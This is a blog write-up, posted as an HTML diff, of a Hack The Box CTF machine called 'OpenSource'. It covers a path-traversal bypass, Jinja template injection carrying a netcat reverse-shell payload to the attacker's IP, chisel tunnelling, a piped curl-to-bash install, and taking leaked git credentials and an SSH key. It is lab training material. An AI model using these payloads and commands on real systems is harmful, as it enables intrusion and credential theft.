@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+
+    <title>First HTB ⛳️: OpenSource</title>
+    <meta name="description" content="">
+
+    <link rel="stylesheet" href="https:&#x2F;&#x2F;drbh.github.io&#x2F;writeups&#x2F;main.css">
+
+    
+
+    
+    
+</head>
+<body>
+    <a class="skip-main" href="#main">Skip to content</a>
+    <div class="container">
+        <header> 
+            <h1 class="site-header">
+                <a href="https:&#x2F;&#x2F;drbh.github.io&#x2F;writeups&#x2F;"></a>
+            </h1>
+            <nav>
+                
+                
+                
+            </nav>
+        </header>
+        <main id="main" tabindex="-1">
+            
+
+<article class="post">
+    <header>
+        <h1>First HTB ⛳️: OpenSource</h1>
+    </header>
+    <div class="content">
+        <p>This weekend I hacked my way through my first Hack The Box CTF. This was an exciting/frustrating and enlightening experience. </p>
+<p>This writeup chronicles how I hacked the box and some of the interesting things I learned on the way.</p>
+<span id="continue-reading"></span><h1 id="the-journey">The Journey</h1>
+<p>The <a href="https://app.hackthebox.com/machines">OpenSource machine</a> was my first HTB CTF, and I had a great time hacking away and capturing the flags.</p>
+<p>This machine is named open source because the exploit revolves around an open-source web app that has some serious but subtle bugs.</p>
+<p>I was especially excited to get started on this challenge since it is focused on software development, and I'm coming to the pen testing world as a software engineer.</p>
+<h2 id="discovery">Discovery</h2>
+<p><strong>Scan ports</strong></p>
+<p>First we run a port scan on the box to see what services are running. </p>
+<pre style="background-color:#2b303b;">
+<code class="language-bash" data-lang="bash"><span style="color:#bf616a;">➜</span><span style="color:#c0c5ce;"> sudo nmap</span><span style="color:#bf616a;"> -sS -A</span><span style="color:#c0c5ce;"> 10.10.11.164
+</span></code></pre><pre style="background-color:#2b303b;">
+<code><span style="color:#c0c5ce;">Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-24 22:37 EDT
+Nmap scan report for 10.10.11.164
+Host is up (0.0097s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT     STATE    SERVICE VERSION
+22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+80/tcp   open     http    Werkzeug/2.1.2 Python/3.10.3
+3000/tcp filtered ppp
+...
+</span></code></pre>
+<p>We know that port 22 is <code>ssh</code>, 3000 is some service that looks like it's running but has some IP rules protecting it. Lastly we have port 80 running the custom web app.</p>
+<p>We'll be taking at look at ports <code>80</code> first and <code>3000</code> later since it's filtered.</p>
+<p>Note:</p>
+<ol>
+<li>we have 2 open ports, ssh and http</li>
+<li>1 filtered (probably IP rules on the box)</li>
+</ol>
+<p><strong>Explore source code structure</strong></p>
+<p>We can navigate to the IP in our browser to see what the site looks like.</p>
+<p>At the bottom of the page we are given a link to the source. Which we can see the file structure of below.</p>
+<pre style="background-color:#2b303b;">
+<code class="language-bash" data-lang="bash"><span style="color:#bf616a;">➜</span><span style="color:#c0c5ce;"> tree .</span><span style="color:#bf616a;"> -L</span><span style="color:#c0c5ce;"> 3
+</span><span style="color:#96b5b4;">.
+</span><span style="color:#bf616a;">├──</span><span style="color:#c0c5ce;"> .git
+</span><span style="color:#bf616a;">│</span><span style="color:#c0c5ce;">     ├── ...
+</span><span style="color:#bf616a;">│</span><span style="color:#c0c5ce;">     └── refs
+</span><span style="color:#bf616a;">├──</span><span style="color:#c0c5ce;"> Dockerfile
+</span><span style="color:#bf616a;">├──</span><span style="color:#c0c5ce;"> app
+</span><span style="color:#bf616a;">│</span><span style="color:#c0c5ce;">     ├── INSTALL.md
+</span><span style="color:#bf616a;">│</span><span style="color:#c0c5ce;">     ├── app
+</span><span style="color:#bf616a;">│</span><span style="color:#c0c5ce;">     │     ├── __init__.py
+</span><span style="color:#bf616a;">│</span><span style="color:#c0c5ce;">     │     ├── __pycache__
+</span><span style="color:#bf616a;">│</span><span style="color:#c0c5ce;">     │     ├── configuration.py
+</span><span style="color:#bf616a;">│</span><span style="color:#c0c5ce;">     │     ├── static
+</span><span style="color:#bf616a;">│</span><span style="color:#c0c5ce;">     │     ├── templates
+</span><span style="color:#bf616a;">│</span><span style="color:#c0c5ce;">     │     ├── utils.py
+</span><span style="color:#bf616a;">│</span><span style="color:#c0c5ce;">     │     └── views.py
+</span><span style="color:#bf616a;">│</span><span style="color:#c0c5ce;">     ├── public
+</span><span style="color:#bf616a;">│</span><span style="color:#c0c5ce;">     │     └── uploads
+</span><span style="color:#bf616a;">│</span><span style="color:#c0c5ce;">     ├── requests
+</span><span style="color:#bf616a;">│</span><span style="color:#c0c5ce;">     │     ├── code-execution
+</span><span style="color:#bf616a;">│</span><span style="color:#c0c5ce;">     │     └── update-index
+</span><span style="color:#bf616a;">│</span><span style="color:#c0c5ce;">     └── run.py
+</span><span style="color:#bf616a;">├──</span><span style="color:#c0c5ce;"> build-docker.sh
+</span><span style="color:#bf616a;">└──</span><span style="color:#c0c5ce;"> config
+    </span><span style="color:#bf616a;">└──</span><span style="color:#c0c5ce;"> supervisord.conf
+
+</span><span style="color:#bf616a;">9</span><span style="color:#c0c5ce;"> directories, 11 files
+</span></code></pre>
+<p>Note:</p>
+<ol>
+<li>It's a git repo</li>
+<li>It's using a <code>docker</code> container</li>
+<li>It's using <code>supervisord</code></li>
+</ol>
+<p><strong>Explore source code contents</strong></p>
+<p><em>snippet from views.py</em></p>
+<pre style="background-color:#2b303b;">
+<code class="language-python" data-lang="python"><span style="color:#c0c5ce;">@app.</span><span style="color:#bf616a;">route</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">/upcloud</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">methods</span><span style="color:#c0c5ce;">=[&#39;</span><span style="color:#a3be8c;">GET</span><span style="color:#c0c5ce;">&#39;, &#39;</span><span style="color:#a3be8c;">POST</span><span style="color:#c0c5ce;">&#39;])
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">upload_file</span><span style="color:#c0c5ce;">():
+    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">request.method == &#39;</span><span style="color:#a3be8c;">POST</span><span style="color:#c0c5ce;">&#39;:
+        f = request.files[&#39;</span><span style="color:#a3be8c;">file</span><span style="color:#c0c5ce;">&#39;]
+        file_name = </span><span style="color:#bf616a;">get_file_name</span><span style="color:#c0c5ce;">(f.filename)
+        file_path = os.path.</span><span style="color:#bf616a;">join</span><span style="color:#c0c5ce;">(os.</span><span style="color:#bf616a;">getcwd</span><span style="color:#c0c5ce;">(), &quot;</span><span style="color:#a3be8c;">public</span><span style="color:#c0c5ce;">&quot;, &quot;</span><span style="color:#a3be8c;">uploads</span><span style="color:#c0c5ce;">&quot;, file_name)
+        f.</span><span style="color:#bf616a;">save</span><span style="color:#c0c5ce;">(file_path)
+        </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">render_template</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">success.html</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">file_url</span><span style="color:#c0c5ce;">=request.host_url + &quot;</span><span style="color:#a3be8c;">uploads/</span><span style="color:#c0c5ce;">&quot; + file_name)
+    </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">render_template</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">upload.html</span><span style="color:#c0c5ce;">&#39;)
+
+
+@app.</span><span style="color:#bf616a;">route</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">/uploads/&lt;path:path&gt;</span><span style="color:#c0c5ce;">&#39;)
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">send_report</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">path</span><span style="color:#c0c5ce;">):
+    path = </span><span style="color:#bf616a;">get_file_name</span><span style="color:#c0c5ce;">(path)
+    </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">send_file</span><span style="color:#c0c5ce;">(os.path.</span><span style="color:#bf616a;">join</span><span style="color:#c0c5ce;">(os.</span><span style="color:#bf616a;">getcwd</span><span style="color:#c0c5ce;">(), &quot;</span><span style="color:#a3be8c;">public</span><span style="color:#c0c5ce;">&quot;, &quot;</span><span style="color:#a3be8c;">uploads</span><span style="color:#c0c5ce;">&quot;, path))
+</span></code></pre>
+<p>Inside of the <code>app/views.py</code> file we can see that the code makes relative path calls using user input.</p>
+<p>This looks like a good way for us to access more data ont the box. Or possibly a way to place a file in a favorable location.</p>
+<p><strong>Examine validation logic</strong></p>
+<p>Inside of <code>app/utils.py</code> can see that there's some custom written validation logic that removes any <code>../</code> (dot dot slash).</p>
+<pre style="background-color:#2b303b;">
+<code class="language-python" data-lang="python"><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">get_file_name</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">unsafe_filename</span><span style="color:#c0c5ce;">):
+    </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">recursive_replace</span><span style="color:#c0c5ce;">(unsafe_filename, &quot;</span><span style="color:#a3be8c;">../</span><span style="color:#c0c5ce;">&quot;, &quot;&quot;)
+
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">recursive_replace</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">search</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">replace_me</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">with_me</span><span style="color:#c0c5ce;">):
+    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">replace_me not in search:
+        </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">search
+    </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">recursive_replace</span><span style="color:#c0c5ce;">(search.</span><span style="color:#bf616a;">replace</span><span style="color:#c0c5ce;">(replace_me, with_me), replace_me, with_me)
+</span></code></pre>
+<p>Note:</p>
+<ol>
+<li>written recursively which makes it hard to trick</li>
+<li>can't use <code>../</code> </li>
+<li>maybe <code>//</code> (directly navigate to root)?</li>
+</ol>
+<p><strong>Testing entrypoint</strong></p>
+<p>We can craft a request to send that should upload a file to an unexpected directory</p>
+<p>First lets craft a new file called <code>prove.http</code>. </p>
+<pre style="background-color:#2b303b;">
+<code class="language-http" data-lang="http"><span style="color:#c0c5ce;">GET /uploads/..%2F/app/run.py HTTP/1.1
+Connection: close
+
+
+</span></code></pre>
+<p>This file contains a simple GET request that attampts to exploit the uploads file to include a file we know exists (from the open source) in a directory above the expected one.</p>
+<p>Send it with netcat</p>
+<pre style="background-color:#2b303b;">
+<code class="language-bash" data-lang="bash"><span style="color:#bf616a;">nc</span><span style="color:#c0c5ce;"> 10.10.11.164 80 &lt; prove.http
+</span></code></pre>
+<p>Response</p>
+<pre style="background-color:#2b303b;">
+<code class="language-http" data-lang="http"><span style="color:#c0c5ce;">HTTP/1.1 200 OK
+Server: Werkzeug/2.1.2 Python/3.10.3
+Date: Tue, 31 May 2022 04:45:51 GMT
+Content-Disposition: inline; filename=run.py
+Content-Type: text/x-python; charset=utf-8
+Content-Length: 141
+Last-Modified: Wed, 23 Mar 2022 00:33:44 GMT
+Cache-Control: no-cache
+ETag: &quot;1647995624.0-141-388170764&quot;
+Date: Tue, 31 May 2022 04:45:51 GMT
+Connection: close
+
+import os
+
+from app import app
+
+if __name__ == &quot;__main__&quot;:
+    port = int(os.environ.get(&quot;PORT&quot;, 80))
+    app.run(host=&#39;0.0.0.0&#39;, port=port)
+</span></code></pre>
+<p>🙌 woo thats a great response. We can see that the server runs the contents of a python file.</p>
+<p>Next lets use this exploit to escalate our access. Our goal is to open a reverse shell on the box.</p>
+<h2 id="foothold">Foothold</h2>
+<p>Now that we have a viable attack vector we want to use it to give us remote code execution.</p>
+<p>From our discovery we know that we can write files, but it's unclear which file we should upload.</p>
+<p><strong>Exploit relative path</strong></p>
+<p>If we look into the source code further we can see that there are <code>template</code> files. These seem to be HTML with a templating languge. </p>
+<p>For example this is a snippet from the <code>templates/success.html</code> file that shows the double curly bracket notation. </p>
+<p>The double curly brackets is from the <code>jinja</code> template libray, and should allow us to limited execution.</p>
+<p>We can do some execution like <code>{{ 2+2 }}</code> which would resolve as <code>{{ 4 }}</code></p>
+<pre style="background-color:#2b303b;">
+<code class="language-html" data-lang="html"><span style="color:#c0c5ce;">&lt;</span><span style="color:#bf616a;">p</span><span style="color:#c0c5ce;">&gt;Your &lt;</span><span style="color:#bf616a;">a </span><span style="color:#d08770;">style</span><span style="color:#c0c5ce;">=&quot;text-decoration: none;&quot; </span><span style="color:#d08770;">href</span><span style="color:#c0c5ce;">=&quot;</span><span style="color:#a3be8c;">{{ file_url }}</span><span style="color:#c0c5ce;">&quot;&gt;file&lt;/</span><span style="color:#bf616a;">a</span><span style="color:#c0c5ce;">&gt; has been uploaded.&lt;/</span><span style="color:#bf616a;">p</span><span style="color:#c0c5ce;">&gt;
+</span></code></pre>
+<p>Instead of writing new files, we can overwrite the template files and exploit the jinja injection notation to execute remote code.</p>
+<p>With a quick google, thanks to Podalirius' <a href="https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/">article</a> we can also see that it's shouldnt be hard to esclate to arbitrary code execution if we can access the shell.</p>
+<p>Essentally we want to write something like this</p>
+<pre style="background-color:#2b303b;">
+<code class="language-python" data-lang="python"><span style="color:#bf616a;">self
+  </span><span style="color:#c0c5ce;">.</span><span style="color:#96b5b4;">__init__
+  </span><span style="color:#c0c5ce;">.__globals__
+  .__builtins__
+  .__import__(&#39;</span><span style="color:#a3be8c;">os</span><span style="color:#c0c5ce;">&#39;)
+  .system(&#39;</span><span style="color:#a3be8c;">id</span><span style="color:#c0c5ce;">&#39;)
+</span></code></pre>
+<p>but with a reverse shell payload, so we want:</p>
+<pre style="background-color:#2b303b;">
+<code class="language-python" data-lang="python"><span style="color:#bf616a;">self
+  </span><span style="color:#c0c5ce;">.</span><span style="color:#96b5b4;">__init__
+  </span><span style="color:#c0c5ce;">.__globals__
+  .__builtins__
+  .__import__(&#39;</span><span style="color:#a3be8c;">os</span><span style="color:#c0c5ce;">&#39;)
+  .system(&#39;</span><span style="color:#a3be8c;">nc 10.10.14.7 4444 -e /bin/sh</span><span style="color:#c0c5ce;">&#39;)
+</span></code></pre>
+<p><strong>Reverse shell</strong></p>
+<p>We can craft a HTTP request using this payload and lets just completely replace the root page on the server.</p>
+<p>Of course this will make our attack obvious to anyone using the site, so in a real world situation we'd hide this payload inside of the main page instead.</p>
+<pre style="background-color:#2b303b;">
+<code class="language-http" data-lang="http"><span style="color:#c0c5ce;">POST /upcloud HTTP/1.1
+Host: 10.10.11.164
+Content-Length: 5853
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://10.10.11.164
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySHIrKoubQdZqALfJ
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://10.10.11.164/upcloud
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+------WebKitFormBoundarySHIrKoubQdZqALfJ
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;//app/app/templates/index.html&quot;
+Content-Type: application/octet-stream
+
+{{
+self.__init__.__globals__.__builtins__.__import__(&#39;os&#39;).system(&#39;nc 10.10.14.7 4444 -e /bin/sh&#39;)
+}}
+------WebKitFormBoundarySHIrKoubQdZqALfJ--
+
+
+</span></code></pre>
+<p>Now on our attacking machine we want to prepare ourselves to recieve the reverse shell that we just planted.</p>
+<pre style="background-color:#2b303b;">
+<code class="language-bash" data-lang="bash"><span style="color:#65737e;"># nc or ncat if your on osx
+</span><span style="color:#bf616a;">ncat -lvp</span><span style="color:#c0c5ce;"> 4444
+</span></code></pre>
+<p>Send the exploit </p>
+<pre style="background-color:#2b303b;">
+<code class="language-bash" data-lang="bash"><span style="color:#bf616a;">nc</span><span style="color:#c0c5ce;"> 10.10.11.164 80 &lt; exploit.http
+</span></code></pre>
+<p>Finally we can open the webpage in our browser to trigger the code and connect back to our listener. </p>
+<p>💥 we have a shell!</p>
+<p><strong>Upgrade shell</strong></p>
+<p>The shell we have is pretty crappy and we'll want to upgrade it before we explore this box. </p>
+<p>First lets open a better shell binary <code>ash</code></p>
+<pre style="background-color:#2b303b;">
+<code class="language-sh" data-lang="sh"><span style="color:#bf616a;">python -c </span><span style="color:#c0c5ce;">&#39;</span><span style="color:#a3be8c;">import pty; pty.spawn(&quot;/bin/ash&quot;)</span><span style="color:#c0c5ce;">&#39;
+</span></code></pre>
+<p>Next we'll need to reset the <code>tty</code> which we can do by moving the current shell to the background reseting <code>stty</code> and rejoining the shell.</p>
+<pre style="background-color:#2b303b;">
+<code class="language-bash" data-lang="bash"><span style="color:#65737e;"># hit CTRL-Z
+</span><span style="color:#bf616a;">stty</span><span style="color:#c0c5ce;"> raw</span><span style="color:#bf616a;"> -echo</span><span style="color:#c0c5ce;">; </span><span style="color:#96b5b4;">fg
+</span></code></pre>
+<p>type <code>reset</code> and press <code>[enter]</code> and we should be met with a much more user friendly shell.</p>
+<p><strong>Explore box</strong></p>
+<p>Now that we have a working shell we can jump all around the box checking out files and access.</p>
+<p>Both the user and root dir's are empty and don't contain flags! We must be in the wrong place... After some more investigating and remembering there's a <code>Dockerfile</code>, we realize we're in a container.</p>
+<p>Note:</p>
+<ol>
+<li>We have <code>root</code></li>
+<li>We're in a container</li>
+</ol>
+<p>At this point we need some way to esclate but it looks unlikely that a Docker exploit will be the way in.</p>
+<p>Lets see if we can communicate with the filtered port we saw earlier. </p>
+<p>We can. Lets explore that further.</p>
+<h2 id="pivot">Pivot</h2>
+<p>Knowing that we can talk to the port. Lets see what services are running.</p>
+<p><strong>Prepare tunnel</strong></p>
+<p>Let's use chisel to tunnel our traffic from out attack box, through the target box.</p>
+<pre style="background-color:#2b303b;">
+<code class="language-bash" data-lang="bash"><span style="color:#bf616a;">wget</span><span style="color:#c0c5ce;"> https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_386.gz
+</span><span style="color:#bf616a;">ncat -lvp</span><span style="color:#c0c5ce;"> 8888 &lt; chisel_1.7.7_linux_386.gz
+</span><span style="color:#bf616a;">nc</span><span style="color:#c0c5ce;"> 10.10.14.46 8888 &gt; chisel.gz
+</span></code></pre>
+<p>On the target box lets unzip this binary and make it executable.</p>
+<pre style="background-color:#2b303b;">
+<code class="language-bash" data-lang="bash"><span style="color:#bf616a;">gzip -d</span><span style="color:#c0c5ce;"> chisel.gz
+</span><span style="color:#bf616a;">chmod</span><span style="color:#c0c5ce;"> +x chisel
+</span></code></pre>
+<p>Now on the attack box, lets listen for the connection</p>
+<pre style="background-color:#2b303b;">
+<code class="language-bash" data-lang="bash"><span style="color:#bf616a;">curl</span><span style="color:#c0c5ce;"> https://i.jpillora.com/chisel! | </span><span style="color:#bf616a;">bash
+chisel</span><span style="color:#c0c5ce;"> server</span><span style="color:#bf616a;"> -p</span><span style="color:#c0c5ce;"> 7000</span><span style="color:#bf616a;"> --reverse -v
+</span></code></pre>
+<p><strong>Tunnel</strong></p>
+<p>Connect </p>
+<pre style="background-color:#2b303b;">
+<code class="language-bash" data-lang="bash"><span style="color:#bf616a;">chisel</span><span style="color:#c0c5ce;"> client 10.10.14.46:7000 R:3000:10.10.11.164:3000
+</span></code></pre>
+<p>Now we should be able to access port <code>localhost:3000</code> in our browser.</p>
+<p>Woop! That works and see can see Gitea running.</p>
+<p><strong>Explore hidden service</strong></p>
+<p>Now that we have access to this git instance we'll want to figure out how to get a shell on the box (not container).</p>
+<p>Snooping around the site we can see there's an existing user named <code>dev01</code> and there's not much else going on.</p>
+<p>At this point maybe we should revisit the <code>.git</code> folder and see if there are any artifacts that can help us.</p>
+<p><strong>Enumerate git commits</strong></p>
+<p>We can take a look at old commits via the git cli. </p>
+<pre style="background-color:#2b303b;">
+<code class="language-bash" data-lang="bash"><span style="color:#bf616a;">git --no-pager</span><span style="color:#c0c5ce;"> log</span><span style="color:#bf616a;"> --decorate</span><span style="color:#c0c5ce;">=short</span><span style="color:#bf616a;"> -3 --stat
+</span></code></pre><pre style="background-color:#2b303b;">
+<code><span style="color:#c0c5ce;">commit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 (HEAD -&gt; dev)
+Author: gituser &lt;gituser@local&gt;
+Date:   Thu Apr 28 13:47:24 2022 +0200
+
+    ease testing
+
+ Dockerfile | 2 +-
+ 1 file changed, 1 insertion(+), 1 deletion(-)
+
+commit be4da71987bbbc8fae7c961fb2de01ebd0be1997
+Author: gituser &lt;gituser@local&gt;
+Date:   Thu Apr 28 13:46:54 2022 +0200
+
+    added gitignore
+
+ .gitignore                | 26 ++++++++++++++++++++++++++
+ app/.vscode/settings.json |  5 -----
+ 2 files changed, 26 insertions(+), 5 deletions(-)
+
+commit a76f8f75f7a4a12b706b0cf9c983796fa1985820
+Author: gituser &lt;gituser@local&gt;
+Date:   Thu Apr 28 13:46:16 2022 +0200
+
+    updated
+
+ app/.vscode/settings.json |  5 +++++
+ app/app/views.py          | 14 ++++++++++++--
+ 2 files changed, 17 insertions(+), 2 deletions(-)
+</span></code></pre>
+<p>Its interesting that the <code>app/.vscode/settings.json</code> has been added and deleted on the next commit.</p>
+<p>Lets look at the changes</p>
+<pre style="background-color:#2b303b;">
+<code class="language-bash" data-lang="bash"><span style="color:#bf616a;">git </span><span style="color:#c0c5ce;">\
+</span><span style="color:#bf616a;">    --no-pager</span><span style="color:#c0c5ce;"> diff \
+    a76f8f75f7a4a12b706b0cf9c983796fa1985820 \
+    -- app/.vscode/settings.json
+</span></code></pre><pre style="background-color:#2b303b;">
+<code><span style="color:#c0c5ce;">@@ -1,5 +0,0 @@
+-{
+-  &quot;python.pythonPath&quot;: &quot;/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python&quot;,
+-  &quot;http.proxy&quot;: &quot;http://dev01:Soulless_Developer#2022@10.10.10.128:5187/&quot;,
+-  &quot;http.proxyStrictSSL&quot;: false
+-}
+</span></code></pre>
+<p>🙌 amazing! We can see that the dev accidently commited the <code>user:pass</code></p>
+<p><strong>Explore git account</strong></p>
+<p>From this point we can use the UI to access the account by entering the creds we just found.</p>
+<p>After logging in, we can see that <code>dev01</code> has a private repo called <code>home-backup</code>. </p>
+<p>Inside of <code>home-backup</code> we have a <code>.ssh/</code> folder which luckily (a super bad move by dev01) contains a private ssh key.</p>
+<p><strong>Clone ssh key</strong></p>
+<p>We can grab the key from the browser or download it as a file directly.</p>
+<pre style="background-color:#2b303b;">
+<code class="language-bash" data-lang="bash"><span style="color:#bf616a;">curl </span><span style="color:#c0c5ce;">\
+</span><span style="color:#bf616a;">    --user </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">dev01:Soulless_Developer#2022</span><span style="color:#c0c5ce;">&quot; \
+    http://localhost:3000/dev01/home-backup/raw/branch/main/.ssh/id_rsa &gt; sshkey.pem
+</span></code></pre>
+<p>Finally, we'll try the key on the box</p>
+<pre style="background-color:#2b303b;">
+<code class="language-bash" data-lang="bash"><span style="color:#65737e;"># chmod 400 sshkey.pem
+</span><span style="color:#bf616a;">ssh -i</span><span style="color:#c0c5ce;"> sshkey.pem dev01@10.10.11.164
+</span></code></pre>
+<p>💥 and were in!</p>
+<p><strong>Show user flag</strong></p>
+<p>Last step for the first flag is to <code>cat</code> the contents of the file.</p>
+<pre style="background-color:#2b303b;">
+<code class="language-bash" data-lang="bash"><span style="color:#bf616a;">cat</span><span style="color:#c0c5ce;"> user.txt
+</span></code></pre>
+<p>🍾 WOOOOOOO, we did it. Our first CTF flag (at least the user flag)</p>
+<p>Next steps is to escalate our access to <code>root</code> but we'll leave that for another day.</p>
+<h1 id="summary">Summary</h1>
+<p>Description: </p>
+<p>We used a <strong>relative path bug</strong> to leverage <strong>local file inclusion</strong> to <strong>open a reverse shell</strong> into the docker container. Then we <strong>pivoted</strong> from the container by <strong>tunneling traffic</strong> from the <strong>hidden service (git)</strong> to our local machine. Next we were able to esclate our access by <strong>enumerating old git commits</strong> to find hidden a hidden credential. Finally we were able to us the creds to access a <strong>ssh key</strong> which allowed us to access the box as a user.</p>
+<p>Steps:</p>
+<ul>
+<li>Scan ports</li>
+<li>Explore source code structure</li>
+<li>Explore source code contents</li>
+<li>Examine validation logic</li>
+<li>Testing entrypoint</li>
+<li>Exploit relative path</li>
+<li>Reverse shell</li>
+<li>Upgrade shell</li>
+<li>Explore box</li>
+<li>Prepare tunnel</li>
+<li>Tunnel</li>
+<li>Explore hidden service</li>
+<li>Enumerate git commits</li>
+<li>Explore git account</li>
+<li>Clone ssh key</li>
+<li>Show user flag</li>
+</ul>
+
+    </div>
+
+    
+    <div class="article-info">
+        
+        <div class="article-date">30 May 2022</div>
+        
+        <div class="article-taxonomies">
+            
+                <ul class="article-categories">
+                    
+                    <li><a href="https://drbh.github.io/writeups/categories/htb/">htb</a></li>
+                    
+                </ul>
+            
+            
+        </div>
+    </div>
+
+</article>
+
+
+        </main>
+        <footer>
+            <p>
+                ©  2022<br>
+                Powered by <a target="_blank" href="https://getzola.org/">Zola</a>, Theme <a target="_blank" href="https://github.com/zbrox/anpu-zola-theme">Anpu</a>.
+            </p>
+            <p>
+                
+                
+            </p>
+        </footer>
+    </div>
+</body>
+</html>
